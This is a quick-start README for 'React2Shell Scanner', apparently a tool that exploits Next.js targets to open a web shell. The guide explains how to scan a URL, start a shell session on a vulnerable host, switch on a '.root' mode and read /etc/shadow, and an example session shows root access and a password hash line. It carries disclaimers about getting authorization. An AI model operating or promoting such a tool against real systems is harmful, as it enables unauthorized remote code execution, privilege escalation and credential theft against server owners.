# ⚡ Quick Start Guide

Get React2Shell Scanner running in 30 seconds!

---

## 🚀 Installation

```bash
# 1. Download/Clone
git clone https://github.com/yourusername/react2shell-scanner.git
cd react2shell-scanner

# 2. Start (No installation needed!)
node server.js
```

That's it! No npm install, no dependencies, just Node.js!

---

## 🎯 Basic Usage

### 1. Open Browser
```
http://localhost:3000
```

### 2. Scan a Target
- Enter target URL: `https://example.com/`
- Click "Start Scan"
- Wait for results

### 3. Use Interactive Shell
- If vulnerable, click "Start Shell Session"
- Type commands in the terminal
- Press Enter to execute

---

## 💡 Quick Commands

### In the Web Shell:

```bash
# Check who you are
whoami

# Get system info
uname -a

# List files
ls -la

# Change directory
cd /var/www

# Enable root mode
.root

# View sensitive files (as root)
cat /etc/shadow
```

---

## ⚠️ Important

**Before You Start:**
- ✅ Get written authorization
- ✅ Only test systems you own or have permission to test
- ❌ Never test production systems without authorization

**Unauthorized access is illegal!**

---

## 🆘 Troubleshooting

### Server won't start?
```bash
# Check if Node.js is installed
node --version

# Try a different port
PORT=8080 node server.js
```

### Can't connect to target?
- Verify the URL is correct
- Check if target is accessible
- Ensure target runs Next.js

### Shell not working?
- Run a successful scan first
- Check browser console for errors
- Try refreshing the page

---

## 📚 Learn More

- **Full Documentation**: See `README.md`
- **Detailed Usage**: See `USAGE_GUIDE.md`
- **API Reference**: See `README.md` API section

---

## 🎓 Example Session

```bash
# Start server
node server.js

# In browser: http://localhost:3000
# Enter URL: https://vulnerable-app.com/
# Click: Start Scan

# If vulnerable:
# Click: Start Shell Session

# In terminal:
user@target:~$ whoami
ubuntu

user@target:~$ .root
Root mode ENABLED

root@target:~$ id
uid=0(root) gid=0(root) groups=0(root)

root@target:~$ cat /etc/shadow
root:$6$xyz...:18908:0:99999:7:::
```

---

**You're ready to go! Happy (ethical) hacking! 🎯**

Remember: Always get authorization first!
